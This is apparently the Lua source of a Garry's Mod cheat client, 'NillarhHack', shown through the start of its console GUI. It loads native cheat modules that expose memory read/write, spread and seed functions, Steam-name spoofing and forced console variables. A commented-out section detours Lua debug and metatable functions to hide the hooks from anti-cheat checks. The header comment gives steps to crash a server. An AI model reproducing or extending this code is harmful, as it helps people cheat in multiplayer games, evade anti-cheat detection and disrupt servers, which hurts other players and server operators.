-- Font = Banner

// sv_allowcslua 1; lua_openscript_cl Athena.lua; sv_allowcslua 0

/*

**Crash
Take 2 balls from the fun+games section >
Rope them >
Make them both small >
Rope again >
Slider them >
CRASHED.

**make somthing super slidey
Physical properties >
Super ice.

**see & shoot through special wall
Color >
Mode = world glow >
FX = Solid fast >
opticaty = 0 >
on wall

place a moving material on another
you can now see throught the first one.


**ent_fire
if svcheats 1
http://facepunch.com/showthread.php?t=426185
 
ent_setname barrel1
ent_fire barrel1 setparent !player

ent_fire player ignite

ent_fire !picker setbodygroup 1
it removes gman's briefcase/gives Kleiner a clipboard etc.

That'd be !self, not !player. !picker is what you're looking at.

ent_fire skybox kill
ent_fire !picker kill

ent_fire !player kill

ent_fire npc_metropolice setrelationship "!player D_LK 0"
will make all the metropolice currently on the map love you

ent_fire team <color>

ent_create prop_combine_ball; ent_fire prop_combine_ball explode
npc_create npc_dog; ent_setname dog2; ent_fire dog1 setthrowtarget dog1; npc_create npc_dog; ent_setname dog1; ent_fire dog1 setthrowtarget dog2

npc_create npc_zombie; ent_fire npc_zombie ignite
it burns the npc (any npc can be ignited)

ent_fire npc_zombie setrelationship "player d_fr 99"
the zombie becomes your friend

prop_physics_Create props_c17/oildrum001_explosive.mdl
ent_setname Derp
ent_fire Derp addoutput "onhealthchanged !activator,ignite"
Shoot the barrel ;D
*/

hook.Call("InitPostEntity")

local Module = {};

// because of the fact that you cant call localplayer in the top i need to do it like this
local me = me;

--[[
--Dll Functions

//NillarhHack
CleanUpGlobals	=	function: 0x3bc86690
RawRead	=	function: 0x3bccbf90
RawWrite	=	function: 0x3c8d7cd8
RunConsoleCommand	=	function: 0x3c92f0d8
GetSpread	=	function: 0x3c7ad8a0
SetCVarName	=	function: 0x3c975b40
SetEyeAngles	=	function: 0x3cac9fc0
LogToFile	=	function: 0x3bba08c8
SetSteamName	=	function: 0x3c81f038
GetSteamName	=	function: 0x3c91f788
SetViewAngles	=	function: 0x3c925ca0
FileExists	=	function: 0x3c837ca8
GetCommandNumber	=	function: 0x3c77c538
GetSeed	=	function: 0x3bc7b800
SetCVar	=	function: 0x3c788e78

//Kroy
NoDraw	=	function: 0x510e58f8
ForceCVar	=	function: 0x40428ec0

]]

--[[
65 a
66 b
67 c
68 d
69 e
70 f
71 g
72 h
73 i
74 j
75 k
76 l
77 m
78 n
79 o
80 p
81 q
82 r
83 s
84 t
85 u
86 v
87 x
88 y
89 z



Code	
s = "ABCDEF"
print(string.byte(s))
print(string.byte(s, 2))
print(string.byte(s, 3, 5))
 
Output	65
66
67       68       69



Code	
print(string.char(65))
print(string.char(65, 66, 67))
Output	A
ABC


]]


local g, r, NH = table["Copy"]( _G ), debug["getregistry"](), {};
NH.Version = "4L"

// Create Folders
g.file.CreateDir("NillarhHack", "DATA")
g.file.CreateDir("NillarhHack/configs", "DATA")
g.file.CreateDir("NillarhHack/scripts", "DATA")
g.file.CreateDir("NillarhHack/log", "DATA")
g.file.CreateDir("NillarhHack/img", "DATA")
g.file.Delete("NillarhHack/configs/default.txt", "DATA") // fix some errors

// Local and delete the exposed interface from the module
require("NillarhHack");
PrintTable(OH_CPP_INTERFACE);
Module.INillarhHack = {}
Module.INillarhHack = OH_CPP_INTERFACE
OH_CPP_INTERFACE = nil;

local tempname = g.string.upper( g.string.char( 72 ) )..g.string.lower( g.string.char( 69, 82, 65 ) )

require("Kroy");
PrintTable(hera);
Module.Kroy = {}
Module.Kroy = hera
hera = nil;

// fix because of outdated module
Module.INillarhHack.GetServerIP = function() return "127.0.0.1"; end
/*
Module.INillarhHack.RunFromCacheDynamic = function( fileto, tableto ) return g.RunString( g.file.Read("NillarhHack/scripts/"..fileto, "GAME") ); end
*/
Module.INillarhHack.SetCallback = function( callback, func ) return nil; end
/*
Module.INillarhHack.CreateDir = function( dir ) return g.file.CreateDir( "NillarhHack/"..dir, "DATA" ); end
*/
Module.INillarhHack.GetVersion = function() return "3L"; end

Module.INillarhHack.Disconnect = function( reason ) return g.RunConsoleCommand("disconnect"); end
/*// i fixed it later on in the code
Module.INillarhHack.IsVisible = function( dir, pos, ent )
	if ( (g.util.TraceLine({start = dir, endpos = pos, filter = { me, ent }, mask = MASK_SHOT + CONTENTS_WINDOW })).Fraction >= (0.99 or 1) ) then return true; end
	return false; 
end
*/
Module.INillarhHack.IsDormant = function( EntIndex ) return false; end

Module.INillarhHack.GetLPIndex = function( LPIndex ) return LocalPlayer():EntIndex(); end
/*
Module.INillarhHack.RawWrite = function( filename, values, randombullshit ) return g.file.Write(filename, values, "DATA"); end

Module.INillarhHack.RawRead = function( filename ) return g.file.Read( filename, "DATA" ); end
*/

/*
NH.CreateDir = function( dir ) return g.file.CreateDir( "NillarhHack/"..dir, "DATA" ); end
NH.RawWrite = function( filename, values, randombullshit ) return g.file.Write( "NillarhHack/"..filename, values, "DATA" ); end
NH.RawRead = function( filename ) return g.file.Read( "NillarhHack/"..filename, "DATA" ); end
NH.RunFromCacheDynamic = function( filename, tablename ) return g.RunString( g.file.Read("NillarhHack/scripts/"..fileto, "GAME") ); end
*/

--
NH.Traitor = {}; // Redo
NH.Traitor.Weps = {};
NH.Traitor.Players = {};
--

--=========================================--
--=================Detours=================--
--=========================================--

NH.Detours = {};

NH.Detours.MetaCache = {}; // { meta = old meta table, detours = list of detoured functions } }
NH.Detours.Modes = { DETOUR_NORMAL = 1, DETOUR_NOOVERWRITE = 2 }

// Detours a function using the metatable of the table that the function is inside.
function NH.Detours.Add( tab, tabKey, detour, mode )

	if ( !NH.Detours.MetaCache[ g.tostring( tab ) ] ) then 

		NH.Detours.MetaCache[ g.tostring( tab ) ] = { meta = g.getmetatable( tab ), detours = { }, mode = mode };

	end

	
	g.setmetatable( tab, {
		__index = function( t, k )

			if ( NH.Detours.MetaCache[ g.tostring( t ) ] && NH.Detours.MetaCache[ g.tostring( t ) ].detours[ k ] && NH.Detours.MetaCache[ g.tostring( t ) ].detours[ k ].original ) then

				return NH.Detours.MetaCache[ g.tostring( t ) ].detours[ k ].detour;

			else 

				return g.rawget( t, k );

			end

		end,
		__newindex = function( t, k, v )

			if ( NH.Detours.MetaCache[ g.tostring( t ) ] && NH.Detours.MetaCache[ g.tostring( t ) ].detours[ k ] && NH.Detours.MetaCache[ g.tostring( t ) ].detours[ k ].mode == 2 ) then

				NH.Detours.MetaCache[ g.tostring( t ) ].detours[ k ].original = v;
				return true;

			else 

				g.rawset( t, k, v );

			end

		end
	} );

	// Add the detour
	NH.Detours.MetaCache[ g.tostring( tab ) ].detours[ tabKey ] = { detour = detour, original = tab[ tabKey ], mode = mode };

	// __index isn't called if the index existed for some reanon, so make sure we destroy the original.
	tab[ tabKey ] = nil;

end

// Remove a detour
function NH.Detours.Remove( tab, tabKey )

	if ( NH.Detours.MetaCache[ g.tostring( tab ) ] ) then 

		tab[tabKey] = NH.Detours.MetaCache[ g.tostring( tab ) ].detours[ tabKey ].original;
		NH.Detours.MetaCache[ g.tostring( tab ) ].detours[ tabKey ] = nil;

	end

end

// Get the original function before a detour.
function NH.Detours.GetOriginal( tab, tabKey )

	return NH.Detours.MetaCache[ g.tostring( tab ) ] and NH.Detours.MetaCache[ g.tostring( tab ) ].detours[ tabKey ].original or ( tab[ tabKey ] or nil );

end

// Get the original function before a detour.
function NH.Detours.GetOriginalFromClone( func )

	for name, tab in g.pairs( NH.Detours.MetaCache ) do 

		for name, data in g.pairs( tab.detours ) do 

			if ( data.original == func ) then return data.detour; end
			if ( data.detour == func ) then return data.original; end
 
		end

	end

	return func;

end

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Protect against people overwriting the metatables //

/* ========================================

=========================================== */
--[[
NH.Detours.Add( _G, "getmetatable", function( tab ) 

	if ( NH.Detours.MetaCache[ g.tostring( tab ) ] ) then 

		return NH.Detours.MetaCache[ g.tostring( tab ) ].meta;

	else 

		return NH.Detours.GetOriginal( _G, "getmetatable" )( tab );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug, "getmetatable", function( tab ) 

	if ( NH.Detours.MetaCache[ g.tostring( tab ) ] ) then 

		return NH.Detours.MetaCache[ g.tostring( tab ) ].meta;

	else 

		return NH.Detours.GetOriginal( _G.debug, "getmetatable" )( tab );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G, "setmetatable", function( tab, meta ) 

	if ( NH.Detours.MetaCache[ g.tostring( tab ) ] ) then 

		NH.Detours.MetaCache[ g.tostring( tab ) ].meta = meta;

	else 

		return NH.Detours.GetOriginal( _G, "setmetatable" )( tab, meta );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug, "setmetatable", function( tab, meta ) 

	if ( NH.Detours.MetaCache[ g.tostring( tab ) ] ) then 

		NH.Detours.MetaCache[ g.tostring( tab ) ].meta = meta;

	else 

		return NH.Detours.GetOriginal( _G.debug, "setmetatable" )( tab, meta );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

// Make sure they don't use rawget/rawset on our detoured tables.

NH.Detours.Add( _G, "rawset", function( tab, key, val ) 

	if ( NH.Detours.MetaCache[ g.tostring( tab ) ] && g.getmetatable( tab ).__index ) then 

		return g.getmetatable( tab ).__index( tab, key );

	else 

		return NH.Detours.GetOriginal( _G, "rawset" )( tab, key, val );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G, "rawget", function( tab, key ) 

	if ( NH.Detours.MetaCache[ g.tostring( tab ) ] && g.getmetatable( tab ).__index ) then 

		return g.getmetatable( tab ).__index( tab, key );

	else 

		return NH.Detours.GetOriginal( _G, "rawget" )( tab, key, val );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

// Other detour masking

NH.Detours.Add( _G.jit.util, "funcbc", function( func, ... )

	return NH.Detours.GetOriginal( _G.jit.util, "funcbc" )( NH.Detours.GetOriginalFromClone( func ), ... );

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.jit.util, "funck", function( func, ... )

	return NH.Detours.GetOriginal( _G.jit.util, "funck" )( NH.Detours.GetOriginalFromClone( func ), ... );

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.jit.util, "funcinfo", function( func, ... )

	return NH.Detours.GetOriginal( _G.jit.util, "funcinfo" )( NH.Detours.GetOriginalFromClone( func ), ... );

end, NH.Detours.Modes.DETOUR_NORMAL );


/* ========================================

=========================================== */

NH.Detours.Add( _G.jit.util, "funcuvname", function( func, ... )

	return NH.Detours.GetOriginal( _G.jit.util, "funcuvname" )( NH.Detours.GetOriginalFromClone( func ), ... );

end, NH.Detours.Modes.DETOUR_NORMAL );


/* ========================================

=========================================== */

NH.Detours.Add( _G, "tostring", function( var, ... )

	if ( g.isfunction( var ) ) then 

		var = NH.Detours.GetOriginalFromClone( var ); 

	end

	return NH.Detours.GetOriginal( _G, "tostring" )( var, ... );

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug, "getinfo", function( func, ... )

	return NH.Detours.GetOriginal( _G.debug, "getinfo" )( NH.Detours.GetOriginalFromClone( func ), ... );

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug, "getupvalue", function( func, ... )

	return NH.Detours.GetOriginal( _G.debug, "getupvalue" )( NH.Detours.GetOriginalFromClone( func ), ... );

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug, "setupvalue", function( func, ... )

	return NH.Detours.GetOriginal( _G.debug, "setupvalue" )( NH.Detours.GetOriginalFromClone( func ), ... );

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug, "getlocal", function( func, ... )

	return NH.Detours.GetOriginal( _G.debug, "getlocal" )( NH.Detours.GetOriginalFromClone( func ), ... );

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug, "setlocal", function( func, ... )

	return NH.Detours.GetOriginal( _G.debug, "setlocal" )( NH.Detours.GetOriginalFromClone( func ), ... );

end, NH.Detours.Modes.DETOUR_NORMAL );
]]
--=========================================--
--=================Detours=================--
--=========================================--

// Super mega important variable initialization
NH.CurrentConfig = "default";

/*
	 #     #                          #####                                   
	 #     #  ####   ####  #    #    #     # #   #  ####  ##### ###### #    # 
	 #     # #    # #    # #   #     #        # #  #        #   #      ##  ## 
	 ####### #    # #    # ####       #####    #    ####    #   #####  # ## # 
	 #     # #    # #    # #  #            #   #        #   #   #      #    # 
	 #     # #    # #    # #   #     #     #   #   #    #   #   #      #    # 
	 #     #  ####   ####  #    #     #####    #    ####    #   ###### #    # 
*/                                                                         
--[[
NH.Hooks = {};

local mHook = {};
mHook.Hooks = {};

function mHook.GetTable()

	return mHook.Hooks;

end

function mHook.Remove( event_name, name )

	if ( !isstring( event_name ) ) then return end
	if ( !mHook[ event_name ] ) then return end

	mHook[ event_name ][ name ] = nil

end

function mHook.Run( name, ... )

	mHook.Call( name, nil, ... )

end 

function mHook.Add( event_name, name, func )

	if ( !isfunction( func ) ) then return end
	if ( !isstring( event_name ) ) then return end

	if (mHook[ event_name ] == nil) then
		mHook[ event_name ] = {}
	end

	mHook[ event_name ][ name ] = func

end

function mHook.Call( name, gm, ... )

	local _hooks = mHook.Hooks[ name ];

	local r1, r2, r3, r4, r5, r6, r7, r8, r9;

	if ( gm == nil && gmod != nil ) then
		gm = g.gmod.GetGamemode()
	end

	if ( NH.Hooks[ name ] ) then

		r1, r2, r3, r4, r5, r6, r7, r8, r9 = NH.Hooks[ name ]( g.unpack( {...} ) ); 

		if ( r1 != nil ) then 

			return r1, r2, r3, r4, r5, r6, r7, r8, r9;

		end

	end

	if ( _hooks ) then 

		for _name, func in g.pairs( _hooks ) do 

			if ( isstring( _name ) ) then 

				err, r1, r2, r3, r4, r5, r6, r7, r8, r9 = g.pcall( func, ... );

			else 

				if ( g.IsValid( _name ) ) then 

					err, r1, r2, r3, r4, r5, r6, r7, r8, r9 = g.pcall( func, _name, ... );

				end

			end

			if ( !err ) then 

				g.Msg( "Hook " .. _name .. " Failed! :" .. r1 .. '\n' );

			else 

				if ( r1 ) then 

					return r1, r2, r3, r4, r5, r6, r7, r8, r9;

				end

			end

		end

	end

	if ( gm ) then 

		local func = gm[ name ];

		if ( isfunction( func ) ) then 

			err, r1, r2, r3, r4, r5, r6, r7, r8, r9 = g.pcall( func, gm, unpack( {...} ) );

			if ( !err ) then 

				g.Msg( "Hook GAMEMODE:" .. name .. " Failed! :" .. r1 .. '\n' );

			else 

				return r1, r2, r3, r4, r5, r6, r7, r8, r9;

			end

		end

	end
	
end

NH.Detours.Add( _G, "hook", mHook, NH.Detours.Modes.DETOUR_NOOVERWRITE );
]]
/*
  #####                                              #####                       
 #     # #####   ##   #####  ##### #    # #####     #     #  ####  #####  ###### 
 #         #    #  #  #    #   #   #    # #    #    #       #    # #    # #      
  #####    #   #    # #    #   #   #    # #    #    #       #    # #    # #####  
       #   #   ###### #####    #   #    # #####     #       #    # #    # #      
 #     #   #   #    # #   #    #   #    # #         #     # #    # #    # #      
  #####    #   #    # #    #   #    ####  #          #####   ####  #####  ###### 
*/                                                                            

// Used in places, such as the cache handler and net/rcc logs
local host = g.string.len( g.GetHostName() ) > 24 and g.string.sub( g.GetHostName(), 1, 24 ) or g.GetHostName();
NH.IP = host .. " (" .. g.string.Replace( Module.INillarhHack.GetServerIP(), ":", " - " ) .. ")";

// Replace certain characters that cannot be written as file / directory
NH.IP = g.string.Replace( NH.IP, "|", " " );
NH.IP = g.string.Replace( NH.IP, "<", " " );
NH.IP = g.string.Replace( NH.IP, ">", " " );
NH.IP = g.string.Replace( NH.IP, "\"", " " );
NH.IP = g.string.Replace( NH.IP, "?", " " );
NH.IP = g.string.Replace( NH.IP, "*", " " );
NH.IP = g.string.Replace( NH.IP, ":", " " );
NH.IP = g.string.Replace( NH.IP, "/", " " );
NH.IP = g.string.Replace( NH.IP, "\\", " " );


/*
	#     #  #####  #     # ###    #######                                                 
	#     # #     # #     #  #     #       #      ###### #    # ###### #    # #####  ####  
	#     # #       #     #  #     #       #      #      ##  ## #      ##   #   #   #      
	#     # #  #### #     #  #     #####   #      #####  # ## # #####  # #  #   #    ####  
	 #   #  #     # #     #  #     #       #      #      #    # #      #  # #   #        # 
	  # #   #     # #     #  #     #       #      #      #    # #      #   ##   #   #    # 
	   #     #####   #####  ###    ####### ###### ###### #    # ###### #    #   #    ###
*/

NH.VGUI = {};
NH.VGUI.ElementFactory = {};

NH.VGUI.Cols = {};

NH.VGUI.Cols.Highlight = 		g.Color( 60, 172, 220, 255 );
NH.VGUI.Cols.BGDark = 			g.Color( 229, 229, 229, 255 );
NH.VGUI.Cols.BGLight = 			g.Color( 244, 244, 244, 255 );
NH.VGUI.Cols.White = 			g.Color( 255, 255, 255, 255 );
NH.VGUI.Cols.GrayOutline = 		g.Color( 173, 178, 181, 255 );

NH.VGUI.Cols.TextDisabled = 	g.Color( 147, 147, 147, 255 );
NH.VGUI.Cols.TextPressed = 		g.Color( 245, 245, 245, 255 );

NH.VGUI.Cols.ButtonDisaled = 	g.Color( 213, 213, 213, 255 );
NH.VGUI.Cols.ButtonHovered = 	g.Color( 169, 169, 169, 255 );
NH.VGUI.Cols.ButtonPressed = 	g.Color( 20, 20, 20, 255 );


/* ======================================================================================================================================= */

local panel = {};

function panel:Init()

	self.colour = Color( 0, 0, 0, 0 );
	self.callback = function() end;
	self.isFaded = true;

end 

function panel:GetColour()

	return self.colour;

end 

function panel:Paint()

	NH.DrawInvisible( 0, 0, self:GetWide(), self:GetTall() );

end

function panel:ColorChanged()

	// Override

end

function panel:ShowCloseButton( bShow )

	self.btnClose:SetVisible( true );
	self.btnMaxim:SetVisible( bShow );
	self.btnMinim:SetVisible( bShow );

end

function panel:IsActive()

	if ( self:HasFocus() ) then return true end
	if ( vgui.FocusedHasParent( self ) ) then return true end
	
	return false

end

function panel:Close()

	self:SetVisible( false )

	if ( self:GetDeleteOnClose() ) then
		self:Remove()
	end

	self:OnClose()

end

function panel:Think()

	if ( !self.targetPosX ) then self.targetPosX = self.x; end
	if ( !self.targetPosY ) then self.targetPosY = self.y; end

	// Colour 

	if ( self.isFaded && !NH.Within( self.colour.a, 0, 2 ) ) then 

		self.colour.a = g.Lerp( 0.70, self.colour.a, 0 );
		panel:ColorChanged( self.colour.a );

	elseif ( !self.isFaded && !NH.Within( self.colour.a, 255, 2 ) ) then 

		self.colour.a = g.Lerp( 0.70, self.colour.a, 255 );
		panel:ColorChanged( self.colour.a );

	end 

	// Position 

	if ( !NH.Within( self.x, self.targetPosX, 3 ) || !NH.Within( self.y, self.targetPosY, 3 ) ) then 

		self.x = g.Lerp( 0.70, self.x, self.targetPosX );
		self.y = g.Lerp( 0.70, self.y, self.targetPosY );

		self:SetPos( self.x, self.y );

		self.canCallCB = true;

	else 

		if ( self.canCallCB ) then self.callback(); end
		self.canCallCB = false;

	end 

end 

function panel:SetCallback( func )

	self.callback = func;

end

function panel:GoTo( x, y )

	self.targetPosX, self.targetPosY = x, y;

end 

function panel:FadeIn()

	self.isFaded = false;

end 

function panel:FadeOut() 

	self.isFaded = true;

end

g.timer.Simple( 0, function() NH.VGUI.RegisterElement( "NHSlidePanel", panel, "EditablePanel" ) end );

/* ======================================================================================================================================== */

// Element registration and creation
function NH.VGUI.RegisterElement( name, mtable, base )

	if ( !name || !mtable ) then return false; end

	mtable.Base = base or "Panel";

	NH.VGUI.ElementFactory[ name ] = mtable;

	g.setmetatable( mtable, {

		__index = function( t, k )

			if ( NH.VGUI.ElementFactory[ mtable.Base ] && NH.VGUI.ElementFactory[ mtable.Base ][ k ] ) then 

				return NH.VGUI.ElementFactory[ mtable.Base ][ k ];

			end 

			return r["Panel"][ k ];

		end

	} );

	return NH.VGUI.ElementFactory[ name ];

end

function NH.VGUI.CreateElement( name, parent )

	if ( NH.VGUI.ElementFactory[ name ] ) then 

		local tab = NH.VGUI.ElementFactory[ name ];
		local panel = NH.VGUI.CreateElement( tab.Base, parent );

		g.table.Merge( panel:GetTable(), tab );

		panel.ClassName, panel.BaseClass = name, NH.VGUI.ElementFactory[ tab.Base ];

		if ( panel.Init ) then 

			local st, err = g.pcall( panel.Init, panel );
			if ( !st ) then NH.Logging.ThrowError( "Panel " .. name .. " failed to initialize! - " .. err ); return nil; end

		end

		panel:Prepare(); return panel;

	end 

	return g.vgui.Create( name, parent );

end

// Load Garry's GUI
--[[Module.INillarhHack.RunFromCacheDynamic( "bin/lua/client/libs/panel/dpanel.lua" )( g, NH.VGUI );

Module.INillarhHack.RunFromCacheDynamic( "bin/lua/client/libs/panel/dlabel.lua" )( g, NH.VGUI ); -- done
Module.INillarhHack.RunFromCacheDynamic( "bin/lua/client/libs/panel/dbutton.lua" )( g, NH.VGUI ); -- done

Module.INillarhHack.RunFromCacheDynamic( "bin/lua/client/libs/panel/dscrollbargrip.lua" )( g, NH.VGUI );
Module.INillarhHack.RunFromCacheDynamic( "bin/lua/client/libs/panel/dvscrollbar.lua" )( g, NH.VGUI );

Module.INillarhHack.RunFromCacheDynamic( "bin/lua/client/libs/panel/dlistview_column.lua" )( g, NH.VGUI );
Module.INillarhHack.RunFromCacheDynamic( "bin/lua/client/libs/panel/dlistview_line.lua" )( g, NH.VGUI );

Module.INillarhHack.RunFromCacheDynamic( "bin/lua/client/libs/panel/dlistview.lua" )( g, NH.VGUI ); -- done


Module.INillarhHack.RunFromCacheDynamic( "bin/lua/client/libs/panel/dtextentry.lua" )( g, NH.VGUI );]]

/*
	 #####                                                        #     #                         ###                                                        
	#     # #####    ##   #####  #    # #  ####    ##   #         #     #  ####  ###### #####      #  #    # ##### ###### #####  ######   ##    ####  ###### 
	#       #    #  #  #  #    # #    # # #    #  #  #  #         #     # #      #      #    #     #  ##   #   #   #      #    # #       #  #  #    # #      
	#  #### #    # #    # #    # ###### # #      #    # #         #     #  ####  #####  #    #     #  # #  #   #   #####  #    # #####  #    # #      #####  
	#     # #####  ###### #####  #    # # #      ###### #         #     #      # #      #####      #  #  # #   #   #      #####  #      ###### #      #      
	#     # #   #  #    # #      #    # # #    # #    # #         #     # #    # #      #   #      #  #   ##   #   #      #   #  #      #    # #    # #      
	 #####  #    # #    # #      #    # #  ####  #    # ######     #####   ####  ###### #    #    ### #    #   #   ###### #    # #      #    #  ####  ######
*/

NH.GUI = {};
NH.GUI.ConsoleHistory = {};
NH.GUI.CurrentConsoleHistoryIndex = 1;

function NH.GUI.AppendConsoleHistory( com )

	NH.GUI.ConsoleHistory[ #NH.GUI.ConsoleHistory + 1 ] = com;

	if ( #NH.GUI.ConsoleHistory >= NH.Get( "Console", "history_length" ) ) then g.table.remove( 1, NH.GUI.ConsoleHistory ); end

end

function NH.GUI.ConsoleOnTextChanged( panel )

	local text = panel:GetValue();
	local sug = "";

	if ( NH.GUI.Console && NH.GUI.Console.SuggestionsList ) then NH.GUI.Console.SuggestionsList:Clear(); end
	NH.GUI.Console.SuggestionsList:SetVisible( false );

	for name, data in pairs( NH.Commands ) do 

		if ( text == "" ) then break; end 

		// Only allow incomplete command names
		if ( name:sub( 1, text:len() ):lower() == text:lower() && text:lower() != name:lower() ) then 

			if ( sug == "" ) then sug = name; end

			if ( NH.GUI.Console && NH.GUI.Console.SuggestionsList ) then 

				NH.GUI.Console.SuggestionsList:AddLine( name );
				NH.GUI.Console.SuggestionsList:SetVisible( true );

			end

		end

	end 

	if ( NH.GUI.Console && NH.GUI.Console.SuggestionOverlay && sug != "" ) then 

		NH.GUI.Console.SuggestionOverlay:SetText( NH.MatchCase( sug, text ) );
		NH.GUI.Console.SuggestionsList:SetVisible( true ); 

	elseif ( NH.Commands[ g.string.Explode( " ", text )[ 1 ] ] ) then 

		local command = g.string.Explode( " ", text )[ 1 ];

		local parsed = false;

		for _, data in g.pairs( NH.ParseCommands( text ) ) do 

			if ( data.name == command ) then 

				parsed = data.args;
				break;

			end

		end

		if ( parsed ) then 

			local sug, sugs =  NH.AutoCompleteCommand( g.string.Explode( " ", text )[ 1 ], command, parsed, text );

			if ( sugs && #sugs <= 0 ) then 

				NH.GUI.Console.SuggestionsList:SetVisible( false );

			elseif ( sugs ) then

				NH.GUI.Console.SuggestionsList:SetVisible( true );
				for _, data in g.pairs( sugs ) do 

					NH.GUI.Console.SuggestionsList:AddLine( data.display );
					NH.GUI.Console.SuggestionsList.Overrides = NH.GUI.Console.SuggestionsList.Overrides or {};
					NH.GUI.Console.SuggestionsList.Overrides[ data.display ] = data.text;

				end

			end


			NH.GUI.Console.SuggestionOverlay:SetText( sug );

		else // Should never happen

			NH.GUI.ConsoleErrorFlash();
			NH.Logging.Print( NH.Get( "Logging", "log_errors" ) , g.Color( 225, 0, 0, 255 ), "Internal command auto-complete parse error!" );

		end

	else 

		NH.GUI.Console.SuggestionsList:SetVisible( false );
		NH.GUI.Console.SuggestionOverlay:SetText("");

	end

end

function NH.GUI.ConsoleOnKey( panel, key )

	if ( key == KEY_UP || key == KEY_DOWN ) then 

		local inc = ( key == KEY_UP and -1 or 1 );
		local val = NH.GUI.CurrentConsoleHistoryIndex;

		if ( NH.GUI.ConsoleHistory[ val + inc ] ) then

			NH.GUI.CurrentConsoleHistoryIndex = val + inc; 

			panel:SetText( NH.GUI.ConsoleHistory[ NH.GUI.CurrentConsoleHistoryIndex ] );
			panel:SetCaretPos( panel:GetValue():len() );

		else 

			NH.GUI.ConsoleErrorFlash();

		end

	elseif ( key == KEY_ESCAPE ) then 

		NH.GUI.ConsoleClose();

	elseif ( key == KEY_ENTER ) then 

		NH.GUI.ConsoleOnCommand( panel );

	elseif ( key == KEY_TAB ) then 

		if ( NH.GUI.Console.SuggestionOverlay && NH.GUI.Console.SuggestionOverlay:GetText() != "" ) then 

			panel:SetText( NH.GUI.Console.SuggestionOverlay:GetText() );
			NH.GUI.ConsoleOnTextChanged( panel );

		end

		// For some reason pressing tab loses focus, let's give it back to us here
		g.timer.Simple( 0, function() 

			panel:RequestFocus();
			panel:SetCaretPos( isstring( panel:GetValue() ) and panel:GetValue():len() or 1 );

		end);

	end 

end

function NH.GUI.ConsoleOnCommand( panel )

	local com = panel:GetValue();
	
	NH.GUI.AppendConsoleHistory( com );
	NH.GUI.CurrentConsoleHistoryIndex = #NH.GUI.ConsoleHistory + 1;

	g.timer.Simple( 0, function() panel:RequestFocus(); panel:SetText(""); end );

	NH.ExecuteCommands( NH.ParseCommands( com ) );

end

function NH.GUI.ConsoleCreate()

	// Console back panel, never "visible" - there's no drawing done here
	NH.GUI.Console = NH.VGUI.CreateElement( "DPanel" )

	NH.GUI.Console:SetPos( g.ScrW() * 0.50, 0 );
	NH.GUI.Console:SetSize( g.ScrW() * 0.50, g.ScrH() );

	NH.GUI.Console:SetVisible( false );
	NH.GUI.Console.Paint = function( panel ) NH.DrawInvisible( 0, 0, panel:GetWide(), panel:GetTall() ) end;

	// Console parent, used as a nice way to achieve the slide effect
	NH.GUI.Console.SlidePanel = NH.VGUI.CreateElement( "NHSlidePanel" );
	NH.GUI.Console.SlidePanel:SetSize( NH.GUI.Console:GetWide() - 200, NH.GUI.Console:GetTall() - 200 );
	NH.GUI.Console.SlidePanel:SetVisible( false );

	// The back of the rich text panel
	NH.GUI.Console.RichTextBack = NH.VGUI.CreateElement( "DPanel", NH.GUI.Console.SlidePanel );

	NH.GUI.Console.RichTextBack:SetPos( 100 + 4, 1 );
	NH.GUI.Console.RichTextBack:SetSize( NH.GUI.Console.SlidePanel:GetWide() - 100, NH.GUI.Console.SlidePanel:GetTall() - 100 - 30 - 2 );

	// Flash panel

	NH.GUI.Console.FlashPanel = NH.VGUI.CreateElement( "DPanel", NH.GUI.Console.SlidePanel )

	NH.GUI.Console.FlashPanel:SetPos( 100 + 4, 1 );
	NH.GUI.Console.FlashPanel:SetSize( NH.GUI.Console.RichTextBack:GetSize() );

	NH.GUI.Console.FlashPanel.Paint = function( panel )

		if ( !panel.fCol ) then panel.fCol = g.Color( 0, 0, 0, 0 ); end 

		if ( panel.fCol.a > 0 ) then panel.fCol.a = g.math.Approach( panel.fCol.a, 0, 5 ); end 

		g.surface.SetDrawColor( panel.fCol );
		g.surface.DrawRect( 0, 0, panel:GetSize() );

	end

	// Console text handler
	NH.GUI.Console.RichText = NH.VGUI.CreateElement( "RichText", NH.GUI.Console.SlidePanel );

	NH.GUI.Console.RichText:SetPos( 100 + 4, 1 );
	NH.GUI.Console.RichText:SetSize( NH.GUI.Console.RichTextBack:GetSize() );

	NH.GUI.Console.RichText:SetVerticalScrollbarEnabled( true );

	// Text entry
	NH.GUI.Console.TextEntry = NH.VGUI.CreateElement( "DTextEntry", NH.GUI.Console.SlidePanel );

	NH.GUI.Console.TextEntry:SetPos( 100 + 4 , 1 + NH.GUI.Console.RichText:GetTall() + 2 );
	NH.GUI.Console.TextEntry:SetSize( NH.GUI.Console.RichText:GetWide() - 58, 20 );

	NH.GUI.Console.TextEntry:SetEnterAllowed( true );
	NH.GUI.Console.TextEntry:SetEditable( true );

	NH.GUI.Console.TextEntry.OnTextChanged = NH.GUI.ConsoleOnTextChanged;
	NH.GUI.Console.TextEntry.OnKeyCodeTyped = NH.GUI.ConsoleOnKey;
	NH.GUI.Console.TextEntry:SetFont( "default" )

	// Sumbit button
	NH.GUI.Console.SubButton = NH.VGUI.CreateElement( "DButton", NH.GUI.Console.SlidePanel );

